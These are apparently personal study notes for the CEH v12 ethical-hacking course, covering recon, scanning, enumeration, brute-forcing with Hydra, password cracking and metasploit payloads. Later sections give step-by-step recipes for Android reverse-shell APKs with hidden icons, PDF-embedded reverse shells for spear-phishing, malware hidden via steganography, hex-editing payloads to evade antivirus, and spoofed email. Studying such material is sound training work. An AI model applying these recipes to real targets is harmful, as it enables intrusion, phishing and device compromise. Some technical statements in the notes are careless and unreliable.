C.E.Hv12 (Certified Ethical Hacker version 12)

*************************
*C.E.H  All In One Notes*
*************************

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
 
$ We Have 20 Modules

1) Introduction to Ethical Hacking
2) Foot printing and Reconnaissance 
3) Scanning Networks 
4) Enumeration 
5) Vulnerability Analysis 
6) System Hacking 
7) Sniffing 
8) Social Engineering 
9) Denial-of-Service 
10) Malware Threats 
11) Session Hijacking 
12) Evading IDS, Firewalls, and Honeypots 
13) Hacking Web Servers 
14) Hacking Web Applications 
15) SQL Injection
16) Hacking Wireless Networks 
17) Hacking Mobile Platforms 
18) Hacking IOT and OT Hacking
19) Cloud Computing 
20) Cryptography
___________________________________________________________________________________________________________________________________________

[1] CIA Triad​

Confidentiality     -----> Only authorized persons have access of data​

Integrity           -----> No one can modify data​

Availability        -----> Data will be available on any time ​

Authenticity        -----> Any data that ensures the quality of being genuine​

Non-Repudiation     -----> It is the assurance that someone cannot deny the validity of something(message)​


Attack = motive + method + vulnerability​

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[2] Classification of attack

​(1) Passive Attack
(2) Active Attack
(3) Closin Attack
(4) Insider Attack
(5) Distribution Attack
---------------------------------------------------------------------------------------------------------

[3] Information Warfare


Defensive Warfare (Blue Team)       |       Offensive Warfare(Red Team)​

-> Prevention​                  	|       -> Web Application Attacks

-> Alerts​					|	  -> Web Server Attacks

-> Detection​				|	  -> Malware Attacks

-> Emergency Preparedness		|​	  -> MITM Attacks

-> Response					|	  -> System Hacking

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
[4] Cyber Kill chain / Kill Chain : The 7 Stages of a Cyber Attack


	Reconnaissance ---> Weaponization ---> Delivery ---> Exploitation ---> Installation ---> Command and Control  ---> Action on Objectives



1. Reconnaissance
2. Weaponization
3. Delivery
4. Exploitation
5. Installation
6. Command and Control
7. Action on Objectives
__________________________________________________________________________________________________________________________________________
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

$ How URL Works :- 
 
=> https://www.kali.org/get-kali/#kali-playeforms

 https            : Protocol
 www              : Subdomain
 kali.org         : Domain
 get-kali         : Sub directory
 #kali-platforms  : Webpages

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

$ Status Code (basic)

200-299 --> working
300 -> redirection
400 -> clint side error (pages not avilable)
403 -> You dont have permision to access page
404 -> Not exist
500 -> interal server error (maintainance)

[?] What Are HTTP Status Codes ? 
[+] An HTTP status code is a three-digit number a server generates in response to a browser’s request Like 404, for example. very time you visit a website, your browser sends 
    a request to the site’s server. Then, the server responds with an HTTP code status. It’s like they’re having a conversation. And each code indicates whether things are 
    working or something is wrong.
   
The first digit in each status code begins with a number between one and five, indicating the code’s category. The second two digits are for specific information under the category. 

For example, let’s use 404 again. 

The first digit (4) indicates a client error. And specifically, 404 means the server couldn’t find the requested resource.  


1XX — Informational codes: The server acknowledges and is processing the request.

2XX — Success codes: The server successfully received, understood, and processed the request.

3XX — Redirection codes: The server received the request, but there’s a redirect to somewhere else (or, in rare cases, some additional action other than a redirect must be completed). 

4XX — Client error codes: The server couldn’t find (or reach) the page or website. This is an error on the site’s side. 

5XX — Server error codes: The client made a valid request, but the server failed to complete the request. 


[1]	1XX — Informational

Status Code					Function

    	100	--------------------->	Continue

	101	--------------------->	Switching Protocols

	102	--------------------->	Processing
	
	103	--------------------->	Early Hints

 	 
[2]	2XX — Success

Status Code					Function

	200	--------------------->	OK

	201	--------------------->	Created

	202	--------------------->	Accepted

	203	--------------------->	Non-Authoritative Information

	204	--------------------->	No Content
	
	205	--------------------->	Reset Content

	206	--------------------->	Partial Content

	207	--------------------->	Multi-Status

	208	--------------------->	Already Reported

	226	--------------------->	IM Used

 	 
[3]	3XX — Redirection

Status Code					Function

	300	--------------------->	Multiple Choices

	301	--------------------->	Moved Permanently

	302	--------------------->	Found

	303	--------------------->	See Other

	304	--------------------->	Not Modified

	307	--------------------->	Temporary Redirect

	308	--------------------->	Permanent Redirect

 	 
[4]	4XX — Client Error


Status Code					Function
 
	400	--------------------->	Bad Request

	401	--------------------->	Unauthorized

	402	--------------------->	Payment Required

	403	--------------------->	Forbidden

	404	--------------------->	Not Found

	405	--------------------->	Method Not Allowed

	406	--------------------->	Not Acceptable

	407	--------------------->	Proxy Authentication Required

	408	--------------------->	Request Timeout

	409	--------------------->	Conflict

	410	--------------------->	Gone

	411	--------------------->	Length Required

	412	--------------------->	Precondition Failed

	413	--------------------->	Content Too Large

	414	--------------------->	URI Too Long

	415	--------------------->	Unsupported Media Type

	416	--------------------->	Range Not Satisfiable

	417	--------------------->	Expectation Failed

	421	--------------------->	Misdirected Request

	422	--------------------->	Unprocessable Content

	423	--------------------->	Locked

	424	--------------------->	Failed Dependency

	425	--------------------->	Too Early

	426	--------------------->	Upgrade Required

	428	--------------------->	Precondition Required

	429	--------------------->	Too Many Requests

	431	--------------------->	Request Header Fields Too Large

	451	--------------------->	Unavailable for Legal Reasons

 	 
[5]	5XX — Server Error

Status Code					Function

	500	--------------------->	Internal Server Error

	501	--------------------->	Not Implemented

	502	--------------------->	Bad Gateway

	503	--------------------->	Service Unavailable

	504	--------------------->	Gateway Timeout

	505	--------------------->	HTTP Version Not Supported

	506	--------------------->	Variant Also Negotiates

	507	--------------------->	Insufficient Storage

	508	--------------------->	Loop Detected

	511	--------------------->	Network Authentication Required

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
$ How URL Works :- 
 
=> https://www.kali.org/get-kali/#kali-playeforms

 https            : Protocol
 www              : Subdomain
 kali.org         : Domain
 get-kali         : Sub directory
 #kali-platforms  : Webpages

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

$ Status Code

200-299 --> working
300 -> redirection
400 -> clint side error (pages not avilable)
403 -> You dont have permision to access page
404 -> Not exist
500 -> interal server error (maintainance)

============================================================================================================================================================================================

[ 2 ] Foot printing and Reconnaissance.


$ WEBSITE FOOTPRINTING
  #ip
  #port
  #subdomian
  #web pages
  #old url
  #Web services / DNS eneuramatation

	$ WEBSITE FOOTPRINTIG
		--->  Try To attack database 
		--->  Try To upload payloads
		--->  Manuplate Web Request 
		--->  Try to get admin pannel
		--->  All Web Based attack (Wpt) 

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
[$] IP  (ways to find an ip).

=> ping google.com                       ---------> ( Ping is a command Use ICMP protocol )
=> whois.com                	          ---------> ( whois.com webiste that contain domian informatation )
=> whois google.com | tee -a google.txt  ---------> [ (whois built in cmmd in kali),(tee) to display work on terminal and save in file,(-a) apend prevent overight ]
=> whois google.com > whois.txt          --------->  [ make all out put into txt file, not display on terminal ]


---------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# SUB-DOMAIN Enumeration 

 # assestfinder google.com | tee ass.txt => for check >> wc ass.txt (wc to count)  (sudo apt install assetfinder)
 # subfinder -d google.com | tee sub.txt => for check >> wc sub.txt (wc to count) [ (-d) provide domain](sudo apt install subfinder )
 # wc ass.txt  (wc is command to count) 

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# WEB-PAGES / Directories (directory conatin webpages , but webpage cant store other directories)

              example:https://www.google.com/[bruteforce here to find more pages]

            --For bruteforce need a Wordlists--- 
                   1. rockyou.txt                   [cd /usr/share/wordlists/rockyou.txt (sudo gzip -d rockyou.txt)]
                   2. Seclists                      (sudo apt install seclists)

# FFUF    
 => ffuf stands for Fuzz Faster U Fool. It's a tool used for web enumeration, fuzzing, and directory brute forcing
    -> apt install gccgo-go -y && apt install golang-go -y && go install github.com/ffuf/ffuf/v2@latest
    => ffuf -w /path/to/wordlist -u https://target/FUZZ      [(-u) to specify an URL (-w) to specify a wordlist. The default keyword (FUZZ) is used to tell ffuf where to bruteforce]
    => ffuf -u http://MACHINE_IP/Death -w /usr/share/seclists/Discovery/Web-Content/big.txt:Death   (death is custom keyword used to fuzz page)
  
#dirsearch 
    -> sudo apt install dirsearch 
    => dirsearch -u google.com                                                    [(-u) for url  (-w) for wordlist]
    => dirsearch -u google -w /usr/share/seclists/Discovery/Web-Content/big.txt  (wordlist isn't neccessory if u need adv. so give it with -w /path/wordlist)

#gobuster
    -> sudo apt install gobuster
    => gobuster dir -u google.com -w /usr/share/wordlist/rockyou.txt  -o   [ (dir) for directory (-u) url (-w) wordlist compulsory (-o) save output ]

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# OLD URLs

$ Cacha memory faster than ram

 => date --> ram--> cacha memory --> android --> obb file and server have cacha memory

 => finding cacha ===> Use // WAY BACK URL//
 
# waybackurl (kali tool)                                (for checking old url snapshot/screenshot / featch old links)
  -> go install github.com/tomnomnom/waybackurls@latest
  => echo "google" | ./waybackurls                      [echo = print | => send to ./waybackurls]


# waybackmachine (website)
internet archive => https://archive.org (just google it waybackurl of "youtube")


# gau        (for featch old url like waybackurl it bring data through new link alternative of internet archive .)
 => go install github.com/lc/gau/v2/cmd/gau@latest
 => echo "google.com" | ./gau | tee -a gau.txt
           OR
 => echo "google.com" | ./gau > gau.txt


---------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Web services / DNS eneuramatation 
           (domain nameserver have records of domain name and ip address so we can find real ip of wesite bez of cloudflare/cloudfront protection called web application protection)

 # dnsdumpster.com     (dns server are multiple, for backup or if 1 not work so use other )
     -> ns4google.com  (name server ip address)
     -> ns3oogle.com   (ns mean name server dns server ip or domain name )
     -> MX RECORDS => Mail exchange server like gmail.com
     -> TXT records=> txt rercords
     -> HOST records=> save ipv4 record...etc

 # dnsenum   (kali tool) 
 => dnsenum zonetransfer.me 
      1. its a testing website zonetransfer.me for testing only.
      2. zone-transfer-Attack (it is type of attack to get info) => for updating querry in 1 server In another server 
         it automatic update is called "axfr" (it is a querry to auto update and verify to provide info).
      3. if we send a malicious requests of make a attack a server it blocked by redirection web site protect them self by using 3-party
         redirection fire wall like Cloude-fair and cloud front
      4. cname => in dnsenum (coniacl name for bypass 403 limited pages)

 # dnsrecon (kali tool)
 => dnsrecon -d google.com
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[ $ ] maltego
 
  => sudo apt install maltego -y
  -> open register  --> ce free -> register
  -> install sources 
  -> top left icon tap -> click new
  -> Phone Number (mobile) --> double click and add phone number --> right click --> all transform.
  -> transform (top tool bar 4.no) --> tansform hubs

___________________________________________________________________________________________________________________________________________________________________________

# wappalyzer extention of firefox / buildwith extention of firefox
  firefox add-ons
___________________________________________________________________________________________________________________________________________________________________________

$ check leak DATA 
  => haveibeenpwend.com      it a website to check leak data leaked 
___________________________________________________________________________________________________________________________________________________________________________

===========================================================================================================================================================================


Passive Information Gathering


[$] Google Dorking
[$] Social Searching
[$] Email Harvesting
[$] Shodan.io


---------------------------------------------------------------------------------------------------------------------------------------------------------------------------


[$] Google Hacking CheatSheet

ext:
intitle:
site:
filetype:
-filetype:
ext:
intitle:"index of" "parent directory"
site:http://target.com ext:txt | ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv
site:http://target.com inurl:admin | administrator | adm | login | l0gin | wp-login

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[$] Email Harvesting 


[#] theharvester
    => theHarvester,which gathers emails, names, subdomains, IPs, and URLs from multiple public data sources

[+] Installation

=> sudo apt install theharvester
=> https://github.com/laramies/theHarvester

 
[*] usage :-

Example at vuln website :-

┌──(kali㉿kali)-[~]
└─$ theharvester -d megacorpone.com -b google          ----------> [ (-d) domain [required] (-b) source to search from]
...
[-] Starting harvesting process for domain: megacorpone.com
[-] Searching in Google:
 Searching 0 results...
 Searching 100 results...
 Searching 200 results...
 Searching 300 results...
 Searching 400 results...
 Searching 500 results...
Harvesting results
No IP addresses found
[+] Emails found:
------------------
joe@megacorpone.com
mcarlow@megacorpone.com
first@megacorpone.com
[+] Hosts found in search engines:
------------------------------------
Total hosts: 13
[-] Resolving hostnames IPs... 
Ns1.megacorpone.com:38.100.193.70
Siem.megacorpone.com:38.100.193.89
admin.megacorpone.com:38.100.193.83
beta.megacorpone.com:38.100.193.88
fs1.megacorpone.com:38.100.193.82
intranet.megacorpone.com:38.100.193.87
mail.megacorpone.com:38.100.193.84


--------------------------------------------------------------------------------------------------------------------------------------------------------------------------

$ gmail  => mail => 3 dot => show original => get ip of mail server 
or
SPF checker -->  pass (ok)
SPF fail (spoof => take name of website and use)
#spf checker => write domain name => if it red it vunerable so we can use domian to send mail
$ Emkei => website
  name => xyz
  e-mail => admin@certifiedhacker.con "certifiedhacker is vunerable.com"
  to: u want to send
etc


===========================================================================================================================================================================


[ 3 ] Scanning Networks 


 
# PORTS Scaning (later on topic use this at last )

basically we scan ports check wheather which service is current active and running on what port number exaclty 
and How many entry gates we have :-

=> things we find in scanning network major
     1. connected devices
     2. Os find
     3. services
     4. application version / service version of system
     5. Connected devices

To scan ports we use Nmap (Network mapping tool)  [build in kali ]

=> Tools are avilable for Port-scanning or we say Network mapping.

[#] Nmap   [Most powerfull and commonly use]
[#] Hping3
[#] Angry ip scanner
[#] Rust scan

[1] Nmap 

=> Nmap has it 2 verion Nmap for cli and Zenmap for gui.
=> Total ports are 65535

[*] usage :- 

 
$ open ports => nmap
      65535 are total n.o of port 
      by default nmap scan top 1000 ports
      namp 10.10.10.10 -p (ports) 1000-10000 or for all -p-



   --------- scan whole internet -----------

sudo masscan "ip" -p1-1000 --rate100000
sudo masscan 0.0.0.0/0 -p1-1000--rate 1000000 --exclude 255.255.255.255

  --------- scan own network and discover ip --------
 => For finding connected device to our router
  # sudo netdiscover

	----- check router ip -----
$ route -n 

        ---- Scan your own home network -----
$ nmap ip/24

 	------- Scan a network and find out which servers and devices are up and running ---------
$ nmap -sP 192.168.1.0/24

 --------------To see packets sent and received received using nmap---------------------

$nmap --packet-trace 192.168.1.10
-----------------------------
3 way hand shake
TCP CLIENT (clint port)-------> TCP SERVER (service ports)
a----->b
  syn
b----->a
  ack (guarenty of getting packed)
a----->b
  ack (to verify open and read to connect)

$WIRESHARK for monitoring network
 => eth0 
   data going in my device and comming

#come to eth0
search bar we use filter to get our data what we want by scaning namp we fetch our data
# filter => ip.addr==10.10.10.10 (ur ip)
# filter => ip.addr==10.10.10.10 && tcp.port ==80 to find tcp syn , ack , rst (rest)

#nmap 10.10.10.10 -sS (half scan) Steal scan / syn scan

$ NMAP all scripts location
cd /usr/share/nmap/scripts

ls | grep ftp (for search in parten ) pwd /usr/share/nmap/scripts (for search script)
# for using all script
namp ip --script=all
nmap ip --script=http* (for all http script)


$sudo masscan 10.10.10.10 -p1-1000 --rate 10000

 FOR SCANING WHOLE INTERNET

#sudo masscan 0.0.0.0/0 -p1-1000 --rate 100000 --exclude 255.255.255.255


---------- check Trace route --------------
$ linux 
#traceroute google.com
path-way of of ur connection to u visiting website

$windows
#tracert google.com

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------



[ 5 ]  Enemuration




we try to connect with services   -----> every service have theri own default credential search it on google  .

https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt


(1) ftp     --> ----> FTP Default passwd and username is anonymous untill it change

ftp ip      



to download file from ftp use :-

$ get  demo.txt
 


(2) ssh

to connect 

ssh user@ip
ssh usernaem@ip -p (port)


(3) Telnet


telnet ip

(4) http

web dir bursting

dirsearch , gobuster


(5) Smb


smbmap -H ip


to go to any directory present in smb by finding by smbmap


smbclient \\192.168.1.1\\tmp



(6) mysql 

mysql -u root -h 192.168.1.2     -------> -u is for username and default name is root (-h /--host) --> ip


(7) Vnc viewer -------> find h.w



Automate all this enumeration useing single tool , it can do all

$ enum4linux 192.168.1.1

$ enum4linux -a 192.168.1.1  (-a all)


===========================================================================================================================================================================

[ 5 ] Vulnerability Analysis




we use Nessus

nikto

nuclei

nuclie -u www.com  ---------> download github

nmap --script=vuln  (it cover all script of vuln)

burpsuit professional 
___________________________________________________________________________________________________________________________________________________________________________


Some later on TOPICS

---------------------------------------------------------------------------------------------------
1. Hide Files or Folder In Windows

open cmd at loaction
$ Attrib +h +s +r foldername      -----> hide
$ Attrib -h -s -r foldername      -----> bring back

example

C:\Users\death\Desktop>Attrib +h +s +r C:\Users\death\Desktop\new.jpeg

C:\Users\death\Desktop>Attrib -h -s -r C:\Users\death\Desktop\new.jpeg

---------------------------------------------------------------------------------------------------

2. stegnography
   hide data behind img , audio , video


=> For windows 

  1. quickstego (Gui based tool)        ---------------> download by my github page ---> https://github.com/Esther7171/Quick-setgo/raw/main/QS12Setup.zip 

   steps :- open --> open image --> write txt --> hide txt --> save image.

  2. steghide (cli based tool)          ---------------> https://github.com/Esther7171/steganography/raw/main/steghide-0.5.1-win32.zip

   work on both windows and linux 
   
   steps:-
   1. go to unzip location of life 
   2. open cmd
   3. steghide.exe (all same as linux)


=> For Linux

we use steghide

sudo apt install steghide

[*] Usage :-

to hide txt behind file :-

$ steghide embed -ef demo.txt -cf wallpaper.jpg    -----> (-ef) ---> embeded file,(-cf) --> coverfile

enter password --> done

to extract txt from image

steghide extract -sf wallpaper.jpg  --> (-sf) --> stegofile 

Their are some tool used to brute force passphase for steg image --> search stegbrute on github

---------------------------------------------------------------------------------------------------
                                   Hide malware

(kali) steghide embed -ef metasploit.exe -cf wallpaper.jpg

(windows)
steghide extract -sf wallpaper.jpg -xf maliciou.exe              -----------> (-xf) output option


___________________________________________________________________________________________________________________________________________________________________________________________





---------------------------------------------------------------------------------------------------

[ * ] Password Based Attacks

password are the most basic form of user accounts and service authentication.
our main goal is to discover and use credentials in order to gain access .
The common approaches to password attack is guess and attemp password through a dictionary attack (collection of words) using a worlist or we can say brute-forcing.


At the time of privileged access of target we are able to extract password hash . we can do leverage passwd cracking in order to gain accesss  


Brute Forcing & Generating Wordlist 
In Brute forcing we use simply hit and trial method to gain access of account,service,system.
the things must be needed a WORDLIST to preform brute-force. We need to creat own wordlist to gain access by gathering info about our target
or we use some default wordlists or common wordlist that everyone can commonly use like a example :- 1234567890, 0987654321 , i love you etc.

Where to find wordlist :-
1. Their are some default wordlist commonly exist in kali.  
2. Seclists  is a collection of wordlist 
3. Use Github.com to find more worlists.
4. Creat/Generate you own by using tools

1. => default wordlist in kali is rockyou.txt that exist in zip formate inside /usr/share/wordlists/
   => sudo gzip -d /usr/share/wordlists/rockyou.txt.gz       ------------> to unzip. 
                   or
   => sudo gunzip sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
2. sudo apt install seclists  

3. Github have some wordlist premade and some tool used to creat wordlists 
4. Creating own worlist are on two way :-

Way 1 -> Creat manually at notepad and other some kind of text editor.

Way 2 -> Use tool to automate this manual process
 
   Tools we use are
  1. bopscrk                           ----> https://github.com/R3nt0n/bopscrk
  2. CeWL			       ----> https://github.com/digininja/cewl
  3. COOK			       ----> https://github.com/giteshnxtlvl/cook
  4. CUPP			       ----> https://github.com/Mebus/cupp                                ---->  cupp -i
  5. Kerberos Username Enumeration     ----> https://github.com/attackdebris/kerberos_enum_userlists
  6. SecLists			       ----> https://github.com/danielmiessler/SecLists
  7. Username Anarchy	               ----> https://github.com/urbanadventurer/username-anarchy

                                                               *****************
							       * BRUTE-FORCING *
							       *****************


Brute Forcing done in two way online and offline 

[1] Online brute forcing is be like brute at login page, running services such as ssh,ftp etc

we have tool to brute force such as :-

(1) hydra
(2) medusa (alternative of hydra no changes but command different)
(3) burpsuit ---------> not good for beginners not reccomanded

[1] Hydra to BRUTE FORCING
                  
# ------------------- H Y D R A ------------------- 

## hydra is powerfull Brute forcing tools. 

=> Hydra supports, i.e., has the ability to brute force the following protocols: “Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, TeamSpeak (TS2), Telnet, VMware-Auth, VNC and XMPP


$ hydra -L user.txt -P passlist.txt ftp://192.168.1.1 -V -t 5

hydra ---> toolname called 

-l ---> provide username when u know 
-L ---> provide wordlist of username
-p ---> provide passwd when u know
-P ---> provide worlist of passwd
(service)://(Machin ip) ---> type of service and machine ip
-V veerbosity 
-t4 --> Number of try word send persecond ,there will be four threads running in parallel -t 4


$ hydra -L (wordlists/path/for/username/brute-force) -P (wordlist/path/for/password/brute-force) service-type://ip -V -t4

example ---> 

$ hydra -l admin -P /usr/share/wordlist/rockyou.txt ssh://192.168.1.1  -V -t5    --------> in this case i allready know the user name is admin 



 
# POST WEB FORM For login forms Brute-force.

$ sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"

 [-l user] [ -p passwd] 10.101.0.1 http-post-form"/admin/login.php:username=^USER^&password=^PASS^:F=incorrect" -V


$ hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

* The login page is only (/), i.e., the main IP address.      example: 10.101.0.1/login.php    
* The (username) is the form field where the username is entered   check in html sheet 
* The specified username(s) will replace (^USER^)                          _
* The password is the form field where the (password) is entered           _
* The provided passwords will be replacing (^PASS^)                        _
* Finally, (F=incorrect) is a string that appears in the server reply when the login fails.  check login-page if u enter worng msg.
```bash
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.139.35  http-post-form "/admin/index.php:user=^USER^&pass=^PASS^&submit=LOGIN:Username or password invalid" -V -t 4

  hydra [user]  [pass]                                [ip]            [login page]  "[path of page]:[inp class]"&[inp class]"&[btn class=btn name]:[its incorrect msg ]

$ hydra -l username -P wordlist.txt 192.168.1.1 http-post-form "/path:input-class-for-user=^USER^&input-class-for-passwd=^PASS^&button-class-for-submit-page=button-name:invalid


[2] offline password cracking

in offline we mostly break or crack hash of files

we have tool to crack hash are

(1) jhon the ripper
(2) hashcat



1.  John
John help to break hash and retreve password

[!] Installation
sudo apt-get install john

[1] Type of Mode :-

1. Single Mode
2. Wordlist
3. Incremental Mode (+i)
4. External Mode

[2] To check Type of Formats support by john 

$ john --list=formats


[*] Usage :-


(1) Basic Syntax 

1. with wordlist
$ john hash.txt -w=/usr/share/wordlist/rockyou.txt 

2. with format
$ john hash.txt --format=RAW-MD5


(2) Single mode

my user and passwd in hash in kali --> /etc/shadow

demo:$y$j9T$wh3JWpxcig6rUK9aoUO6b/$c7AuFl2F7zjNIMXN/TUrjOJl0PDeZo2Fal48mIV6BnA:19772:0:99999:7:::

demo is user and all are hash


what single mode can do , it take user and add random values it like "demo" is my user.
single mode add random values to my user automatically like ---> demo@123 , demo12@32123, demodsvs
the way of add random value is called mangling in terms of john tool and it very quick process.

$ john --single hash.txt --format=RAW-MD5

(3) Wordlist Mode


john --wordlist=/usr/share/wordlist/rockyou.txt hash.txt  --format=RAW-MD5

(4) Incremental Mode 

it is most power and need always rules set but take time.

$ john --incremental:alpha hash.txt --format=RAW-SHA256

alpha --> rule --> use --> min L=1 --> max L=13




{*} Rules in john


$ john --rules=ShiftToggle --wordlist=/usr/share/wordlist/rockyou.txt --stdout | more


"rule shift toggle" make some character capital to small in ur wordlist 


to view all rules

mousepad /etc/john/john.conf


(5) Break shaadow file



to unsahdow /etc/password

$ sudo unshadow /etc/passwd /etc/shadow




to unshadow

$ ubnshadow passwd.txt 


(6) break zip file

zip2john @hide01.zip > zip-hash

$ john zip-hash -w /usr/share/wordlist

(7) External Mode


we can use any c or python hash breaking code add to john

(8) Multi files

john hash1.txt hash2.txt -w 


(9) RAR

$ rar2john demo.rar > new

(10) PDF

$ pdf2john demo.txt > new



(2) hashcat 


hashcat -m 1200 -a 3 hash.txt  wordlist.txt   -----------> [(-m) mode of hash number given in hashcat example] [(-a) type of attack "3" is for bruteforce attack ]

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
								
								***********
								* HASHING *
								*********** 

(1) what is hashing

Ans.Hashing is a technique where the data is converted to hash using different mathematical formulas/algorithms present there.

(2) Types of hash function

Ans. their are lot of hash function  you can check it out on below website.

      https://hashcat.net/wiki/doku.php?id=example_hashes

  commonly used and weak hash functions are:-

       1. Md5 
       2. Sha1
       3. Md4
       4. Sha256

(3) How it work

ANs. Plane txt Password ---> hash fun algo --> store
     123 --> ba1f2511fc30423bdbb183fe33f3dd0f | md5 --> store

How password hash checked

plane txt password ---> convert to hash using a algo ----> hash 

user-input ---> inpute change to hash using same algo -----> case 1 :- if hash match then OK ! ------> else wrong !


                                                                  *************************
                                                                     GENERATaTING HASHES 
                                                                  *************************

[1] Generate Hash of anything/dir/txt-file/
   1.Md5
    -> md5sum "filename/txt"
    -> md5deep "filename/txt"
    -> md5sumtextutils "filename/txt"

 2. sha
    -> sha1sum "filename/txt"
    -> sha1deep "filename/txt"
    -> sha224sum "filename/txt"
    -> sha256deep "filename/txt"
    -> sha256sum "filename/txt"
    -> sha512sum "filename/txt"
    -> shasum "filename/txt"

example --

$ md5sum payload.exe

$ sha256deep payload.exe

[2] Generate Hash of words ,txt

$ print "hii" | md5sum

$ echo "hello world" | sha256deep



[]  HOW TO IDENTIFY HASH 

use kali tool 

hash-identifier 
or check hashcat example online
or check online about hash

___________________________________________________________________________________________________________________________________________________________________________

                                                     **************************
                                                     * RESET KALI AND WINDOWS *
						     **************************

For kali passwd reset

step1. Press any key at time of booting to stop the timer

step2. then press E

step3. scroll down find at right hand side --> ro quiet splash

   replace it with 

step5. rw init=/bin/bash         -----------> to get root shell (init is the first process that been called )

step5. save it with ctrl + x or f10 

        start

step6. then Change passwd --> $ passwd $USER 

step7. $ startx / restart


For windows passwd reset

hirem boot cd and boot on pendrive and reset it.

direct download link ----> https://www.hirensbootcd.org/files/HBCD_PE_x64.iso

and reset passwd

===========================================================================================================================================================================

[ 6 ] System Hacking 


Gain access 
maintain access
clearing logs

In system hacking we Use payload to hack into a system







                                                                       ***************************************************
                                                                         ART OF PAYLOAD GENRATATING METASPLOIT-FRAMEWORK
                                                                       ***************************************************


*******************
* H O S T Payload *
*******************

1. On Python Server
           python -m http.server 80  (use on same network)

2. On Appache Server
           /etc/init.d/appache2 start  (server)
           $ sudo mv mobileapp.apk /var/www/html/
           cd /var/www/html


                                                      ********* Payload Injection in Pdf *********
1. setoolkit (in build in kali)
2. msfconsole (in build in kali)
3. Addition pdf for injection

$ sudo setoolkit

select from the menu:

1)Social -Enginnering Attacks 

set >> 1 

select from the menu:

1. Spear-Phishing Attack Vectors

set >> 1 

1.Perform a Mass Email Attack

2.Create a FileFormat Payload

3.Create a Social-Engineering Template

4. Return to Main Menu

set:phishing>2

13.Adobe PDF Embedded EXE Social Engineering

set:payloads>13

1. Windows Reverse TCP Shell Spawn a command shell on victim and send back to attacker
2. Windows Meterpreter Reverse_TCP Spawn a meterpreter shell on victim and send back to attacker
3. Windows Reverse VNC DLL Spawn a VNC server on victim and send back to attacker
4. Windows Reverse TCP Shell (x64) Windows X64 Command Shell, Reverse TCP Inline
5. Windows Meterpreter Reverse_TCP (X64) Connect back to the attacker (Windows x64), Meterpreter
6. Windows Shell Bind_TCP (X64) Execute payload and create an accepting port on remote system
7. Windows Meterpreter Reverse HTTPS Tunnel communication over HTTP using SSL and use Meterpreter

set:payloads>2


1. Keep the filename, I don't care.
2. Rename the file, I want to be cool.
set >> 2
set:phishing>test.pdf

1. E-Mail Attack Single Email Address
2. E-Mail Attack Mass Mailer
99. Return to main menu.
set:phishing>99

root#ls -al /root/.set/   (HERE U FIND THE PDF PAYLOAD)


                                              ********* Payload for Android ( Hide Payload / hide metasploit apk-- ) **********
=> check ip
 ip addr 

=> generate payload
 msfvenom -p android/meterpreter/reverse_tcp LHOST= LPORT=4444 R> ./mobileapp.apk

=> open console to contol session
 msfconsole

msf5 > use exploit/multi/handler
msf5 > show options
msf5 > set payload android/metrepreter/reverse_tcp
msf5 > set LHOST
msf5 > run

=> using appache ser
   /etc/init.d/appache2 start  (server)
   sudo mv mobileapp.apk /var/www/html/
   cd /var/www/html
   ls -l

$metreperter (active)
- sysinfo
- hide_app_icon  (--to hide app--)



--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                                                          *******************************
                                                                             MAKE PAYLOAD UNDETECTABLE  
                                                                          *******************************
# virus total  ( website to check virus in any file free)

# check strings of payload   (we can make changes in payload so the payload could not be get detected but change only some number dont touch dot changing in payload > it loose functions)

  $ strings payload.exe  (check string values in payload)

#change values in the payload strings
 +
 $ hexeditor payload.exe      [Change only word string and change some numbers (ctrl+ x and enter to save)]
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                            



							**************************
							* PRIVILLAGE ESCALLATION *
							**************************
linpeas
winpeas


============================================================================================================================================================================================


[ 7 ] Sniffing 


It simply mean to watch on going traffic to view credential data



Tools used to Preform SNIFFING.

[+] Wireshark           --------> gui 
    Tcpdump / tshark	--------> Cli






SAML language

